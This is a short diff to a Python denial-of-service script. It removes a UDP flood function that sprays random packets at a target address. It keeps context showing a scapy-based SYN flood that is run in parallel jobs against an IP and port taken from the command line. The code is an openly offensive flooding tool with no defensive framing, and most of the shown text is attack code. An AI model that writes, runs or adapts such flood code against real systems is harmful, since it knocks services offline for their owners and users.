@@ -32,19 +32,8 @@ def send_syn(dstIP,dstPort,num_pkts):
 
         send(IP_Packet/TCP_Packet, verbose=0)
 
-def basic_dos(dst_ip, dst_port, num_pkts):
-    s = socket(AF_INET, SOCK_DGRAM)
-    pkt = _urandom(1362)
-    for i in range(num_pkts):
-        s.sendto(pkt, (dst_ip,dst_port))
-        if (i%1000 ==0):
-            print('packet no.:',i)
-            #print('pkt:',pkt)
-            print('sent to: ',dst_ip+':'+str(dst_port))
-
-
 def syn_flood(func,num_jobs):
-        Parallel(n_jobs=num_jobs)(delayed(func) for i in range(num_jobs))
+    Parallel(n_jobs=num_jobs)(delayed(func) for i in range(num_jobs))
 
 if __name__ == "__main__":
     dstIP,dstPort = argv[1], int(argv[2])
